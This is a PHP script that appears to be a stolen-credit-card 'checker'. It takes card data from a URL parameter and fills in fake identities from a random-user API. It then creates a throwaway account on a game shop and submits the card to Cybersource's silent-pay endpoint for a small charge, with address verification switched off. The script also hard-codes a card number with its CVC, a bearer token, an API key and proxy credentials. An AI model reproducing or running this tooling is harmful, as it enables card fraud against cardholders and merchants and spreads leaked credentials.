
<?php

error_reporting(0);
//ini_set('display_errors', 1);

error_reporting();
set_time_limit(0);

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$i = $_GET['card'];
$cc = multiexplode(array(":", "|", ""), $i)[0];
$mes = multiexplode(array(":", "|", ""), $i)[1];
$ano = multiexplode(array(":", "|", ""), $i)[2];
$cvv = multiexplode(array(":", "|", ""), $i)[3];

date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}
$string = ''.$cc.'';
$typecc = substr($string, 0,1);
if($typecc == "4"){
$number = "001";
}elseif($typecc == "5"){
$number = "002";
}elseif($typecc == "3"){
$number = "003";
}elseif($typecc == "6"){
$number = "004";
}


$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch1, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch1, CURLOPT_HEADER, 0);
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST, 0);
$get = curl_exec($ch1);
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $name = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

    function tres($standardlength = 7) {
        return substr(str_shuffle(str_repeat($alph='0123456789', ceil($standardlength/strlen($alph)) )),1,$standardlength);
    }

    $anony = tres();



    $ch1 = curl_init();
    //curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    //curl_setopt($ch, CURLOPT_PROXY, 'resi.proxyscrape.com:8000');
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, '65d22y9goo0eyk7:TTJgoeTr');
    curl_setopt($ch1, CURLOPT_URL, 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyCKzmxHRyn6RkPcPe_J9WQVoLweTL-1WuI');
    curl_setopt($ch1, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch1, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Host: identitytoolkit.googleapis.com';
    $headers[] = 'sec-ch-ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"';
    $headers[] = 'X-Client-Version: Chrome/JsCore/9.6.8/FirebaseCore-web';
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36';
    $headers[] = 'Origin: https://shop.redcandlegames.com';
    curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, '{"returnSecureToken":true,"email":"'.$first.''.$last.''.$anony.'1@gmail.com","password":"'.$first.''.$last.'@gmail.com"}');
    $result = curl_exec($ch1);
    $idToken = trim(strip_tags(getStr($result, '"idToken": "','",')));


    $ch1 = curl_init();
    //curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    //curl_setopt($ch, CURLOPT_PROXY, 'resi.proxyscrape.com:8000');
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, '65d22y9goo0eyk7:TTJgoeTr');
    curl_setopt($ch1, CURLOPT_URL, 'https://us-central1-devotion-sale.cloudfunctions.net/cybersoureSignFields');
    curl_setopt($ch1, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch1, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Host: us-central1-devotion-sale.cloudfunctions.net';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'sec-ch-ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"';
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'sec-ch-ua-mobile: ?0';
    #$headers[] = 'Authorization: Bearer '.$idToken.'';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36';
    $headers[] = 'sec-ch-ua-platform: "Windows"';
    $headers[] = 'Accept: */*';
    $headers[] = 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjBkMGU4NmJkNjQ3NDBjYWQyNDc1NjI4ZGEyZWM0OTZkZjUyYWRiNWQiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiTWF0aWFzIFN1YXJleiIsInBpY3R1cmUiOiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xODQzMTgxODk5NDU2MDE3L3BpY3R1cmUiLCJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGV2b3Rpb24tc2FsZSIsImF1ZCI6ImRldm90aW9uLXNhbGUiLCJhdXRoX3RpbWUiOjE2OTgxNTQ4MTksInVzZXJfaWQiOiJ4YjRrTTFpdzFpU3ZQRlMydjlSTzRGYmRYRDczIiwic3ViIjoieGI0a00xaXcxaVN2UEZTMnY5Uk80RmJkWEQ3MyIsImlhdCI6MTY5ODE1NDgxOSwiZXhwIjoxNjk4MTU4NDE5LCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImZhY2Vib29rLmNvbSI6WyIxODQzMTgxODk5NDU2MDE3Il19LCJzaWduX2luX3Byb3ZpZGVyIjoiZmFjZWJvb2suY29tIn19.h1py-_eDbrv2iiT-sbAU097xWnhpta_sKMoTqGTOTo5eBkvHVFMTW3fFr9-GRQC7H5ZmA-FKeorE0qYguNeJmcCMEUhuPAhI-vWjDy7Xwfc1X_jqoti1cWzAGQj33MhUpnCLpgxsFwBxfNjhHYWOo82vfkdA5oOCEQAfjLqROB1WFGak6Frpszd0S0uW1KdIeYS5ZHuAdZR1nRrOvvYP_I01lw6vF4teh_DFIDIwyGGdMmL7l_p5IQZnGZmLwRx0p0-4bmc47RM3RP9EixA4LYq6tD42QCQe6A1X18tnrV4Sa8_hIYblxhjkmUnonfIpQasvI8b0nSUDOFiMhP5WHA    ';
    curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, '{"data":{"campaign_slug":null,"slug":"devotion_ost","uid":"JDVo13XUo2UMQwnGA6iHgrla3Nk2","bundle_slug":null,"gateway":"Cybersource","currency":"USD","productEntries":[{"slug":"devotion_ost","uuid":"69e637be-191a-4b3f-a616-9ed354de71c6","num":1}],"token":"","locale":"en-us","billing":{"country":"EC","email":"'.$name.''.$last.'@smartnator.com","phone":"","lastName":"'.$name .'","firstName":"'.$last .'","address":"'.$street.'","address2":"sdasda","city":"'.$city.'","state":"ss","postal_code":"'.$anony.'","cardNumber":"5299 5346 7022 1859","expiryDate":"04 / 24","cvc":"676","receiptType":"B2C","taiwan_customer_identifier":null}}}');
       $result = curl_exec($ch1);
    curl_close($ch1);
    $auth_trans_ref_no = trim(strip_tags(getStr($result,'auth_trans_ref_no":"','",')));
    $merchant_defined_data5 = trim(strip_tags(getStr($result,'"merchant_defined_data5":"','",')));
    $access_key = trim(strip_tags(getStr($result,'"access_key":"','",')));
    $profile_id = trim(strip_tags(getStr($result,'"profile_id":"','",')));
    $transaction_uuid = trim(strip_tags(getStr($result,'"transaction_uuid":"','",')));
    $signed_date_time = trim(strip_tags(getStr($result,'"signed_date_time":"','",')));
    $signed_date_time = urlencode($signed_date_time);
    $reference_number = trim(strip_tags(getStr($result,'"reference_number":"','",')));
    $item_0_sku = trim(strip_tags(getStr($result,'item_0_sku":"','",')));
    $signature = trim(strip_tags(getStr($result,'"signature":"','"}')));
    $signature = urlencode($signature);

$street =str_replace(' ', '+', $street);
$city =str_replace(' ', '+', $city);


$cookies = Array();
$ch = curl_init('https://secureacceptance.cybersource.com/silent/pay');
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$headers1[] = 'Host: secureacceptance.cybersource.com';
$headers1[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0';
$headers1[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers1[] = 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers1[] = 'Content-Type: application/x-www-form-urlencoded';
$headers1[] = 'Origin: https://shop.redcandlegames.com';
$headers1[] = 'DNT: 1';
$headers1[] = 'Connection: keep-alive';
$headers1[] = 'Referer: https://shop.redcandlegames.com/';
$headers1[] = 'Upgrade-Insecure-Requests: 1';
$headers1[] = 'Sec-Fetch-Dest: document';
$headers1[] = 'Sec-Fetch-Mode: navigate';
$headers1[] = 'Sec-Fetch-Site: cross-site';
$headers1[] = 'Content-Length: 1865';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "auth_trans_ref_no=$auth_trans_ref_no&line_item_count=1&merchant_defined_data5=$merchant_defined_data5&merchant_defined_data6=0&merchant_defined_data7=DEVOTION+-+OST&access_key=$access_key&profile_id=$profile_id&transaction_uuid=$transaction_uuid&override_backoffice_post_url=https%3A%2F%2Fus-central1-devotion-sale.cloudfunctions.net%2Fsecure_acceptance_callback&unsigned_field_names=override_backoffice_post_url%2Ccard_type%2Ccard_number%2Ccard_expiry_date%2Ccard_cvn&signed_date_time=$signed_date_time&locale=en-us&transaction_type=sale&reference_number=$reference_number&amount=5.99&currency=USD&payment_method=card&bill_to_forename=$last&bill_to_surname=$name&bill_to_email=$name$last%40gmail.com&bill_to_address_line1=$street&bill_to_address_line2=&bill_to_address_city=$city&bill_to_address_state=&bill_to_address_country=EC&bill_to_address_postal_code=$postcode&ignore_avs=true&item_0_code=devotion_ost&item_0_quantity=1&item_0_sku=$item_0_sku&item_0_name=DEVOTION+-+OST&item_0_unit_price=5.99&signed_field_names=auth_trans_ref_no%2Cline_item_count%2Cmerchant_defined_data5%2Cmerchant_defined_data6%2Cmerchant_defined_data7%2Caccess_key%2Cprofile_id%2Ctransaction_uuid%2Csigned_field_names%2Cunsigned_field_names%2Csigned_date_time%2Clocale%2Ctransaction_type%2Creference_number%2Camount%2Ccurrency%2Cpayment_method%2Cbill_to_forename%2Cbill_to_surname%2Cbill_to_email%2Cbill_to_address_line1%2Cbill_to_address_line2%2Cbill_to_address_city%2Cbill_to_address_state%2Cbill_to_address_country%2Cbill_to_address_postal_code%2Cignore_avs%2Citem_0_code%2Citem_0_quantity%2Citem_0_sku%2Citem_0_name%2Citem_0_unit_price&signature=$signature&card_type=$number&card_number=$cc&card_expiry_date=$mes-$ano&card_cvn=$cvv");
curl_setopt($ch, CURLOPT_HEADERFUNCTION, "curlResponseHeaderCallback");
$result = curl_exec($ch);
var_dump($cookies);

function curlResponseHeaderCallback($ch, $headerLine) {
    global $cookies;
    if (preg_match('/^Set-Cookie:\s*([^;]*)/mi', $headerLine, $cookie) == 1)
        $cookies[] = $cookie;
    return strlen($headerLine); // Needed by curl
}
    exit();

?>